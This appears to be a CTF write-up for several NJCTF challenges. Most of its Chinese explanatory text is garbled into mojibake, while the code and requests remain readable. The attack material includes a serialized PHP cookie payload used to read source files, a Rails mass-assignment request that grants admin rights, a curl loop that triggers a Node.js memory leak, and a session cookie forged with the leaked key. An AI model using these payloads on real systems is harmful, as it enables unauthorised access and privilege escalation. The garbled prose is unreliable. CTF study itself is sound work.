åœ¨é¡µé¢é‡Œå­˜åœ¨.index.php.swo

æ˜¾ç„¶ï¼Œæˆ‘ä»¬è¦è°ƒç”¨__toStringå‡½æ•°å»highlight_fileæˆ‘ä»¬æƒ³çœ‹åˆ°çš„æ•°æ®ã€‚

è¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªå°æŠ€å·§ï¼Œphpä¸­æ•°ç»„é‡Œé¢æœ‰ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒä¼šæœŸæœ›é‚£ä¸ªå¯¹è±¡ä¸ºstringç±»å‹ã€‚æ‰€ä»¥ï¼Œå¦‚æœå¯¹è±¡æ˜¯ä¸€ä¸ªåºåˆ—åŒ–å°±ä¼šè‡ªåŠ¨è°ƒç”¨__toString

æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·æ„é€ 

```php
$lists = [];
Class filelist{
    function __construct($var){
        $this->source = $var;
    }
    public function __toString()
    {
        return highlight_file('hiehiehie.txt', true).highlight_file($this->source, true);
    }
}

$file = new filelist('index.php');
$lists = array($file);
#var_dump(serialize($file));
var_dump(serialize($lists));
```

ç„¶åï¼Œå¯¹å…¶sha1 è¡¥å……åˆ°å‰é¢ï¼Œåé¢urlç¼–ç ä¸€ä¸‹ï¼Œæ”¾åˆ°cookieé‡Œé¢

```url
f3a6de2497f71356a3995e26a1f4f64ae48e80b1%61%3a%31%3a%7b%69%3a%30%3b%4f%3a%38%3a%22%66%69%6c%65%6c%69%73%74%22%3a%31%3a%7b%73%3a%36%3a%22%73%6f%75%72%63%65%22%3b%73%3a%39%3a%22%69%6e%64%65%78%2e%70%68%70%22%3b%7d%7d
```

è¿™æ ·å°±èƒ½çœ‹åˆ°index.phpçš„æºç 

![index](http://momomoxiaoxi.com/img/post/NJCTF/index.png)

/var/www/PnK76P1IDfY5KrwsJrh1pL3c6XJ3fj7E_fl4gåŒæ ·åºåˆ—åŒ–è¯»å–ä¸€ä¸‹å°±å¥½

PS: æ®è¯´å¯ä»¥æ‰¾åˆ°åŸé¢˜ï¼š[https://losfuzzys.github.io/writeup/2016/10/02/tumctf-web50/](https://losfuzzys.github.io/writeup/2016/10/02/tumctf-web50/)

### Blog

rubyçš„ä»£ç å®¡è®¡ ä¸å¤§ä¼š

Tipsï¼šrubyå®¡è®¡æ€è·¯ï¼Œiå¯ä»¥é¦–å…ˆçœ‹route ç„¶åæ‰¾é€»è¾‘ã€‚å¯¹åº”ç€é¡µé¢æ‰¾åˆ°å®ç°ä»£ç 

çœ‹äº†ä¸‹åˆ«äººçš„WP

ä¸»è¦é—®é¢˜åœ¨äºï¼Œtable usersåœ¨å®šä¹‰çš„æ—¶å€™ï¼Œæœ‰ä¸€åˆ—æ ‡å¿—å…¶æ˜¯å¦ä¸ºadminï¼Œé»˜è®¤ä¸ºfalse

```ruby

  create_table "users", force: true do |t|
    t.string   "name"
    t.string   "email"
    t.datetime "created_at"
    t.datetime "updated_at"
    t.string   "password_digest"
    t.string   "remember_token"
    t.boolean  "admin",           default: false
  end

```

è€Œåœ¨æ³¨å†Œç•Œé¢çš„æ³¨å†Œå‡½æ•°ä¸­ï¼Œå®ƒå…¶å®å¤šä¼ äº†ä¸€ä¸ªadminçš„å‚æ•°ã€‚åªæ˜¯åœ¨å®é™…ç•Œé¢ä¸å­˜åœ¨ï¼Œæˆ‘ä»¬æ„é€ ä¸€ä¸ªuser[admin]=1å³å¯ï¼ˆè¿™ä¸ªæ ¼å¼å‚ç…§å…¶ä»–å‚æ•°çš„æ„é€ æ–¹å¼ï¼‰

```ruby
  private
    def user_params
      params.require(:user).permit(:name, :email, :password, :password_confirmation, :admin)
    end
```

æ„é€ ä¸€ä¸ªè¯·æ±‚åŒ…

```http
POST /users HTTP/1.1
Host: 218.2.197.235:23727
Content-Length: 301
Cache-Control: max-age=0
Origin: http://218.2.197.235:23727
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://218.2.197.235:23727/users
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
Cookie: session=eyJhZG1pbiI6Im5vIn0=; session.sig=Uw-lgOYJjpIZLRIXs4H8tv2EK_0; PHPSESSID=kfm3fk6doepaefpaa9al32h8j7; piclist=a%3A2%3A%7Bi%3A0%3Bs%3A43%3A%22upload%2F693a17c7426e064e37c184879f4e4107.png%22%3Bi%3A1%3Bs%3A45%3A%22upload%2F773f33a925049e4906690514266b89cf.phtml%22%3B%7D; _sample_app_session=ZEFvNW5hTzI2aFVSNzNjN05Lc0JISGlFRU04aGE1M3lCL0pyM0xCUkNoWnE4S1VJMGNuUlpOMXl0OXR0aFlMUUlNbGN6ODU1NUxhN21VeU9wbHRyTFNaRHg4STRiZHR4NkRaMzEzalZGSkNKMEZOdjZPRVJ5cklGSEN3OWUxUTByVEVYdUNKQlMxcHJLNHpTZEd5NDd3bUNSSk1kbEFUc2V2aEQramZuSWQ1RUhsNHJxZTZ0bWZiUmdmWjZiSVpuLS1uTG9CM0lBVk1vdzdvM2prL21oUHRnPT0%3D--5607ac4adcab4b1014ea69518f5c5afd8aec911a
Connection: close

utf8=%E2%9C%93&authenticity_token=%2FPQd%2BsT%2B1KX0%2B2vr%2Bqd5ME5G%2B2abPv4x6I3na8FG%2Bcd6QifrU0%2FBEknXMxJIRgvfIzens6iPmAhurvD0foPq9w%3D%3D&user%5Bname%5D=moxiaoxi12345&user%5Bemail%5D=moxiaoxi%40qq11.com&user%5Bpassword%5D=moxiaoxi&user%5Bpassword_confirmation%5D=moxiaoxi&user%5Badmin%5D=1&commit=Create+my+account
```



### CHaII

èƒ½æœåˆ°ä¸€ç¯‡éå¸¸ç›¸ä¼¼çš„åšå®¢

http://smrrd.de/nodejs-hacking-challenge-writeup.html



è¿™é“é¢˜ï¼Œæœ‰ä¸€ä¸ªéå¸¸è„‘æ´çš„åœ°æ–¹ï¼Œå°±æ˜¯å¿…é¡»è¾“å…¥md5å‡ºæ¥å…¨æ˜¯æ•°å­—çš„md5æ‰èƒ½è§¦å‘å†…å­˜æ³„æ¼ã€‚ã€‚ã€‚ã€‚

éå¸¸ç¥å¥‡orz åŸé¢˜å°±æ²¡è¿™ä¹ˆè„‘æ´ã€‚ã€‚

List of few first strings that give only-digit md5 hash:

```
ximaz : 61529519452809720693702583126814 
aalbke : 55203129974456751211900188750366 
afnnsd : 49716523209578759475317816476053 
aooalg : 68619150135523129199070648991237 
bzbkme : 69805916917525281143075153085385 
```

Here's one with only letters:

```
cbaabcdljdac : cadbfdfecdcdcdacdbbbfadbcccefabd
```

è¾“å…¥md5åï¼Œå…¨ä¸ºæ•°å­—çš„æ•°æ®åï¼Œä¼šå›æ˜¾æ•°æ®ã€‚

å†…å­˜æ³„æ¼

å†™ä¸€ä¸ª1.sh

```sh
while ((1));do
    curl http://218.2.197.235:23729/login --data '{"password":"afnnsd"}' -H "Content-Type: application/json" -i
done
```

å¯ä»¥çœ‹åˆ°å¾ˆæ˜æ˜¾çš„å†…å­˜æ³„æ¼

å¯ä»¥æ‰¾åˆ°æ•°æ®

`./1.sh| hexdump -C >1.txt`

NJCTF{P1e45e_s3arch_th1s_s0urce_cod3_0lddriver}

ç„¶ååˆ°githubä¸Šä¸‹è½½æºç ï¼Œåœ¨æœ¬åœ°è·‘ä¸€ä¸‹ã€‚

https://github.com/0lddriver/app

å°†config.jsä¸­çš„æ•°æ®æ”¹ä¸€ä¸‹

```js
var config = {};
config.secret_password = ""
config.session_keys = ["NJCTF{P1e45e_s3arch_th1s_s0urce_cod3_0lddriver}"]
module.exports = config;
```

ç„¶åï¼Œä¿®æ”¹app.jsä¸­çš„noä¸ºyes

```js
app.use(function(req, res, next) {
  if(req.session.admin === undefined) {
    req.session.admin = 'yes';
  }
  next();
});
```

è¿™æ ·å°±èƒ½å¾—åˆ°{"admin":"yes"}çš„ç­¾å

session=eyJhZG1pbiI6InllcyJ9; session.sig=DLXp3JcD1oX3c8v4pUgOAn-pDYo

ç„¶åå»è¯·æ±‚ä¸€ä¸‹admin

```
GET /admin HTTP/1.1
Host: 218.2.197.235:23729
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: session=eyJhZG1pbiI6InllcyJ9; session.sig=DLXp3JcD1oX3c8v4pUgOAn-pDYo
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
If-None-Match: W/"471-PF7BbTeX0i15/QjaTjk5Ww"
```

å°±èƒ½å›æ˜¾åˆ°æ•°æ®

TkpDVEZ7TjBkNUpT5piv5LiW55WM5LiK5pyA5aW955qE6K+t6KiA77yM5a+55ZCX77yffQ==

è§£ç ä¸€ä¸‹å°±æ˜¯flagï¼ˆä¸­æ–‡ï¼‰





### å…¶å®ƒ

é¢å¤–åšäº†ä¸€ä¸ªé¢˜ ä¹Ÿè®°å½•ä¸‹

#### knock

æŸ¥çœ‹é•¿åº¦ï¼Œè«æ–¯å¯†ç è§£å¯†å¤±è´¥

ç„¶åï¼ŒæŸ¥çœ‹äº†ä¸€ä¸‹é•¿åº¦

å‘ç°knocké•¿åº¦145  text118 

å…¶ä¸­ï¼Œknockä¸­_ æœ‰27 .æœ‰118ä¸ª

çŒœæµ‹_æ˜¯åˆ†éš”ç¬¦

```python
#!/usr/bin/env python
#!-*- coding:utf-8 -*-

def readfile(filename):
    with open(filename,"r") as fp:
        content=fp.read()
    return content


knock = readfile("knock.txt")
text  = readfile("text.txt")
# print len(knock),len(text)
# print knock.count('_')
# print knock.count('.')
# print knock
# print text
test = ''
indexpre=0
i=0
while(knock.find('_')!=-1):
	index = knock.find('_')
	knock = knock.replace('_','-',1)
	text =text[:index]+' '+text[index:]
	indexpre=index

print text
```

zjqz hexjz mo oqrs sai daiyn lebn zjo vos ltah zjer horrqxo e iron lobdo za voou zjo vos qfqs ltah mqn qrr joto er zjo horrqxo ebooqydrztyqqojolx

ç„¶åï¼Œè¯é¢‘åˆ†æä¸€ä¸‹

that might be easy you could find the key from this message i used fence to keep the key away from bad ass here is the message ineealcstrlaaehefg

æç¤ºæ˜¯æ …æ å¯†ç 

```
ineeal
cstrla
aehefg
```

6ä½æ …æ 

icanseetheflag



